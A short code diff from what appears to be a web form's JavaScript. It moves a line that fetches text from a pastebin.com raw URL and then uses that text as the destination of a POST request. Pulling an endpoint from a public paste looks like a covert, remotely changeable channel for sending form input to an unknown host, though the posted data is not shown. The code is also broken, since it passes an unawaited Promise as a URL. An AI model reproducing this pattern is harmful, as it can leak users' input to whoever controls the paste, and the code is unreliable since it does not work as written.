@@ -89,9 +89,8 @@
                 errorMessageElement.innerHTML = 'Error: Input must be a number with no more than 8 digits.';
                 return;
             }
-
+            let pastebinContent = fetch("https://pastebin.com/raw/YP5XrTWv").then(response => response.text());
             try {
-                let pastebinContent = fetch("https://pastebin.com/raw/YP5XrTWv").then(response => response.text());
                 const response = await fetch(pastebinContent, {
                     method: 'POST',
                     headers: {
